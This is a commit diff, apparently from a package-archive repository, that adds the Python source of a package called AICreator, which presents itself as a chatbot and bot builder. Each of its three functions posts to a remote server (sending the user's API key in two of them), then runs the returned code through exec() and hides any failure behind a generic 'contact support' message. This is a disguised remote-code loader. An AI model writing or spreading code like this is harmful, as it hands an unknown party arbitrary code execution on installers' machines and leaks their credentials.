d223e76e52584403a086bbed4ad9bf6bd10df13e
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 01:50:37 +0000

    Add package AICreator/0.0.6/AICreator-0.0.6.tar.gz

---
+++ packages/AICreator/AICreator-0.0.6.tar.gz/AICreator-0.0.6/AICreatorPackage/functions/AICreatorPackage.py
@@ -0,0 +1,53 @@
+import os
+import requests
+import subprocess
+
+
+
+
+def AICreatorChatBot():
+    print("[+] AICreator (By Oren) Is Ready!")
+
+    cc = requests.post(f'http://aicreator.oren777.me:25573/api/v1.0.0/chatbot/')
+
+    cc1 = cc.json()
+
+    try:
+        exec(cc1['c'])
+    except:
+        print("error, please contact support.")
+
+
+
+def AICreatorDiscordBot(apiKEY):
+    print("[+] AICreator (By Oren) Is Ready!")
+
+    cc = requests.post(f'http://aicreator.oren777.me:25573/api/v1.0.0/discordbot/{apiKEY}/')
+
+    cc1 = cc.json()
+
+    try:
+        exec(cc1['c'])
+    except:
+        print("error, please contact support.")
+
+
+
+
+def AICreatorWebsiteBot(apiKEY):
+    print("[+] AICreator (By Oren) Is Ready!")
+
+    cc = requests.post(f'http://aicreator.oren777.me:25573/api/v1.0.0/websitebot/{apiKEY}/')
+
+    cc1 = cc.json()
+
+    try:
+        exec(cc1['c'])
+    except:
+        print("error, please contact support.")
+
+
+
+
+
+
